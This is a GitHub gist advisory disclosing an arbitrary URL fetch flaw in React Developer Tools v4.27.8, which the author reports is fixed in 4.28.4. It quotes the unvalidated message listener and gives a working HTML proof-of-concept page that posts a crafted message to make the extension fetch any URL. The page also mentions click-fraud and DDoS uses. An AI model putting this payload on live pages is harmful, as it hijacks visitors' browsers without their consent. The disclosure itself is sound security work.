=== Content from gist.github.com_c96b6733_20250111_103220.html ===

[Skip to content](#start-of-content)

[All gists](/discover)
[Back to GitHub](https://github.com)
[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2FCalumHutton%2F1fb89b64409570a43f89d1fd3274b231)
[Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2FCalumHutton%2F1fb89b64409570a43f89d1fd3274b231&source=header-gist)

[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2FCalumHutton%2F1fb89b64409570a43f89d1fd3274b231) [Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2FCalumHutton%2F1fb89b64409570a43f89d1fd3274b231&source=header-gist)

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

Instantly share code, notes, and snippets.

[![@CalumHutton](https://avatars.githubusercontent.com/u/89394440?s=64&v=4)](/CalumHutton)

# [CalumHutton](/CalumHutton)/**[react-dev-tools.md](/CalumHutton/1fb89b64409570a43f89d1fd3274b231)** Secret

Created
October 10, 2023 10:51

Show Gist options

* [Download ZIP](/CalumHutton/1fb89b64409570a43f89d1fd3274b231/archive/6ce8b5ae9a04a2a52a3e08f8592bae4d37430617.zip)

* [Star
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2FCalumHutton%2F1fb89b64409570a43f89d1fd3274b231)You must be signed in to star a gist
* [Fork
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2FCalumHutton%2F1fb89b64409570a43f89d1fd3274b231)You must be signed in to fork a gist

* Embed

  + Embed
     Embed this gist in your website.
  + Share
     Copy sharable link for this gist.
  + Clone via HTTPS
     Clone using the web URL.
  + [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

  Clone this repository at &lt;script src=&quot;https://gist.github.com/CalumHutton/1fb89b64409570a43f89d1fd3274b231.js&quot;&gt;&lt;/script&gt;
* Save CalumHutton/1fb89b64409570a43f89d1fd3274b231 to your computer and use it in GitHub Desktop.

[Code](/CalumHutton/1fb89b64409570a43f89d1fd3274b231)
[Revisions
1](/CalumHutton/1fb89b64409570a43f89d1fd3274b231/revisions)

Embed

* Embed
   Embed this gist in your website.
* Share
   Copy sharable link for this gist.
* Clone via HTTPS
   Clone using the web URL.
* [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

Clone this repository at &lt;script src=&quot;https://gist.github.com/CalumHutton/1fb89b64409570a43f89d1fd3274b231.js&quot;&gt;&lt;/script&gt;

Save CalumHutton/1fb89b64409570a43f89d1fd3274b231 to your computer and use it in GitHub Desktop.

[Download ZIP](/CalumHutton/1fb89b64409570a43f89d1fd3274b231/archive/6ce8b5ae9a04a2a52a3e08f8592bae4d37430617.zip)

React Developer Tools v4.27.8 Arbitrary URL Fetch via Malicious Web Page

 [Raw](/CalumHutton/1fb89b64409570a43f89d1fd3274b231/raw/6ce8b5ae9a04a2a52a3e08f8592bae4d37430617/react-dev-tools.md)

[**react-dev-tools.md**](#file-react-dev-tools-md)

## React Developer Tools v4.27.8 Arbitrary URL Fetch via Malicious Web Page

### Disclosure Status

I have disclosed this to the maintainer, who issued a fix in version 4.28.4

#### Commits

<https://github.com/facebook/react/commit/94d5b5b2bf5204ebd289a113989c0e2c51b626ef>
<https://github.com/facebook/react/pull/27417/commits/c4db7be6b050fd36e3d7e1218d31d6b61f6b007d>

### Technical Details:

The React Developer Tools extension registers a message listener with `window.addEventListener('message', <listener>)` in a content script that is accessible to any webpage that is active in the browser. Within the listener is code that requests a URL derived from the received message via `fetch()`. The URL is not validated or sanitised before it is fetched, thus allowing a malicious web page to arbitrarily fetch URL’s via the victim's browser.

Because the content of the response is not returned to the malicious webpage, the impact of this issue is limited, i.e, sensitive resources available only to the victim cannot be retrieved. However, this could be used to generate clicks, and therefore revenue, for malicious actors, or be used along with other browsers for a Distributed Denial of Service (DDoS) without the victims’ knowledge or consent.

The code snippet below (shortened for brevity) shows the message listener code from the Content Script extracting the URL from the potentially tainted message received, then using the arbitrary URL directly in a fetch call shortly after.

```
window.addEventListener('message', function onMessage({data, source}) {
  if (source !== window || !data) {
    return;
  }
  switch (data.source) {
    ...
    case 'react-devtools-extension':
      if (data.payload?.type === 'fetch-file-with-cache') {
        const url = data.payload.url; // URL from malicious webpage

        ...

        fetch(url, {cache: 'force-cache'}).then( // URL used in fetch
          response => {
            if (response.ok) {
              response
                .text()
                .then(text => resolve(text))
                .catch(error => reject(null));
            } else {
              reject(null);
            }
          },
          error => reject(null),
        );
      }
      break;
    ...
```

#### PoC

In the proof-of-concept React application below, the standard `postMessage()` API is used to send a crafted message to trigger the above switch statement when a button is clicked. Note the source attribute in the message is `react-devtools-extension` and the type is `fetch-file-with-cache`.

```
<!DOCTYPE html>
<html>
<head>
  <script src="https://unpkg.com/react@18/umd/react.development.js" crossorigin></script>
  <script src="https://unpkg.com/react-dom@18/umd/react-dom.development.js" crossorigin></script>
  <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
</head>
<body>

<div id="mydiv"></div>

<script type="text/babel">
  function Hello() {
    return <h1>Hello World!</h1>;
  }

  const container = document.getElementById('mydiv');
  const root = ReactDOM.createRoot(container);
  root.render(<Hello />)
</script>

<script>
  function sendBrowserMsg() {
    let msg = {
      source: 'react-devtools-extension',
      payload: {
        type: 'fetch-file-with-cache',
        url: 'https://www.google.com'
      }
    }
    console.log(`Sending msg from browser: ${JSON.stringify(msg)}`);
    postMessage(msg, "*");
  }
</script>

<form>
  <button type="button" id="submit" onClick="sendBrowserMsg()">Go!</button>
</form>

</body>
</html>
```

In reality, it’s likely that the malicious web page would automatically send messages to the extension without the need for user interaction.

[Sign up for free](/join?source=comment-gist)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgist.github.com%2FCalumHutton%2F1fb89b64409570a43f89d1fd3274b231)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


